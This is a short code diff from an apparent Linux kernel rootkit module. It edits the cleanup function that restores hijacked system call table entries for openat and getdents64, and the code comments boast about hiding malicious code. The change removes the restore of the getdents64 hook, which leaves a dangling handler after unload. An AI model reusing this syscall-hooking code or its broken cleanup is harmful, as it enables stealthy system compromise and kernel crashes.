@@ -120,7 +120,7 @@ static void exit_sneaky_module(void)
   // This is more magic! Restore the original 'open' system call
   // function address. Will look like malicious code was never there!
   sys_call_table[__NR_openat] = (unsigned long)original_openat;
-  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
+
   // Turn write protection mode back on for sys_call_table
   disable_page_rw((void *)sys_call_table);  
 }  
